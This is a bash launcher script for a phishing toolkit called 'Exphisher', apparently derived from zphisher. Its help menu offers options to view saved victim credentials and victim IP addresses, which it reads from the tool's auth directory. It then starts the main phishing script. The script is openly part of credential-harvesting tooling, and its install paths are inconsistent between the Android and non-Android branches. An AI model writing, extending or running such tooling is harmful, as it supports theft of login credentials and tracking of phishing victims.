#!/bin/bash

# https://github.com/htr-tech/zphisher

if [[ $(uname -o) == *'Android'* ]];then
	EXPHISHER_ROOT="/data/data/com.termux/files/usr/opt/exphisher"
else
	export EXPHISHER_ROOT="/opt/zphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Exphisher type \`exphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $EXPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $EXPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $EXPHISHER_ROOT
	bash ./exphisher.sh
fi
